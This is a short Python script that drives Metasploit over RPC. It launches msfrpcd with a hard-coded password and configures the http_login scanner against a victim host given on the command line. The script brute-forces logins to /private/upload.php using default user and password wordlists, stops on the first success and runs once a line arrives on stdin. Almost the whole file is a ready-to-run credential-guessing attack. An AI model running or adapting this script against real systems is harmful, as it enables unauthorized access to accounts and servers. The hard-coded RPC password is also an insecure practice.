import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
import time

if __name__ == '__main__':
    os.system("./msfrpcd -P password -S")

    victim = sys.argv[1]

    print("INITIALIZING EXPLOIT")

    # connect to Metasploit exploit Server
    while True:
        try:
            client = MsfRpcClient('password', port=55553, ssl=False)
            print("CONNECTED TO MSFRPC")
            break
        except Exception:
            time.sleep(1)

    # metasploit settings
    exploit = client.modules.use('auxiliary', 'scanner/http/http_login')
    exploit['AUTH_URI'] = '/private/upload.php'
    exploit['RHOSTS'] = victim
    exploit['RPORT'] = 443
    exploit['SSL'] = True
    exploit['VERBOSE'] = False
    exploit['DB_ALL_CREDS'] = True
    exploit['DB_ALL_USERS'] = True
    exploit['DB_ALL_PASS'] = True
    exploit['USER_FILE'] = '/opt/metasploit-framework/data/wordlists/http_default_users.txt'
    exploit['PASS_FILE'] = '/opt/metasploit-framework/data/wordlists/http_default_pass.txt'
    exploit['STOP_ON_SUCCESS'] = True
    exploit['MaxGuessesPerService'] = 10000
    exploit['MaxMinutesPerService'] = 10000
    exploit['MaxGuessesPerUser'] = 10000

    cid = client.consoles.console().cid

    # execute exploit after receiving Stdin line
    sys.stdin.readline()
    print(client.consoles.console(cid).run_module_with_output(exploit, None, True))
    client.jobs.stop(0)

    print("Exploit Executed - Shutting Down")
